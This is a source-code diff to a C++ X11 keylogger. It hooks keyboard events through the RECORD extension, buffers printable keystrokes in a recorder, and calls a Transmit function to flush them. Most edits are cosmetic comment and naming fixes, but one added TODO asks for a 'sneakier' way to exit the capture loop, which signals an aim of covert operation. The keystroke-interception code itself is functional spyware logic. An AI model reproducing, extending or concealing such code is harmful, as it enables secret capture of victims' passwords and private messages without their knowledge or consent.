@@ -20,7 +20,7 @@ struct CallbackData {
   keylogger::Recorder* recorder = nullptr;
 };
 
-/* refer to libxnee */
+/* Refer to libxnee. */
 union XRecordDatum {
   unsigned char type;
   xEvent event;
@@ -63,6 +63,8 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
       .same_screen = True,
   };
 
+  /* TODO: Need to look into having a sneakier way of exiting the event loop
+   * than just pressing ESC. */
   const int kEsc = 9;
   char character = '\0';
   int len = ::XLookupString(&raw_event, &character, sizeof(character), nullptr,
@@ -72,10 +74,10 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
       if (key_code == kEsc) { /* if ESC is pressed at any time, exit */
         exit_event_loop = true;
       } else {
-        /* casting std::print()'s argument to unsigned char as advised here:
+        /* Casting std::isprint()'s argument to unsigned char as advised here:
          * https://en.cppreference.com/w/cpp/string/byte/isprint*/
         if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
-          /* buffer printable characters, discard all others */
+          /* Buffer printable characters, discard all others. */
           cb_data->recorder->BufferKeyPress(character);
         }
       }
@@ -86,7 +88,7 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
   ::XRecordFreeData(hook);
 }
 
-void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
+void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
   ::Display* ctrl_disp = XOpenDisplay(nullptr);
   ::Display* data_disp = XOpenDisplay(nullptr);
   if (!ctrl_disp || !data_disp) {
@@ -99,8 +101,8 @@ void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
     throw std::runtime_error("RECORD extension not supported on this X server");
   }
 
-  /* we must set the ctrl_disp to sync mode, or, when we enable the context
-   * in data_disp, there will be a fatal X error */
+  /* We must set the ctrl_disp to sync mode, or, when we enable the context
+   * in data_disp, there will be a fatal X error. */
   ::XSynchronize(ctrl_disp, true);
 
   ::XRecordRange* record_rng = ::XRecordAllocRange();
@@ -130,7 +132,7 @@ void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
     ::XRecordProcessReplies(data_disp);
   }
 
-  /* flush any remaining keycodes in the recorder */
+  /* Flush any remaining keycodes in the recorder. */
   recorder->Transmit();
 
   ::XRecordDisableContext(ctrl_disp, record_ctx);
